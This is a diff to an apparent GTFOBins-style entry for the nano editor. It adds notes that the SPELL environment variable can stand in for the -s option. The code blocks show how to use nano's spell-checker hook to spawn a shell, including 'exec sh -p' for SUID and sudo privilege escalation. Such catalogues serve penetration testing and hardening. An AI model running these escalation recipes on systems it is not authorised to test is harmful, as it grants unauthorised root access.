@@ -1,7 +1,8 @@
 ---
 functions:
   shell:
-    - code: |
+    - description: The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.
+      code: |
         TF=$(mktemp)
         echo 'exec sh' > $TF
         chmod +x $TF
@@ -15,14 +16,16 @@ functions:
   file-read:
     - code: nano file_to_read
   suid:
-    - code: |
+    - description: The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.
+      code: |
         TF=$(mktemp)
         echo 'exec sh -p' > $TF
         chmod +x $TF
         ./nano -s $TF /etc/hosts
         ^T
   sudo:
-    - code: |
+    - description: The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.
+      code: |
         TF=$(mktemp)
         echo 'exec sh' > $TF
         chmod +x $TF
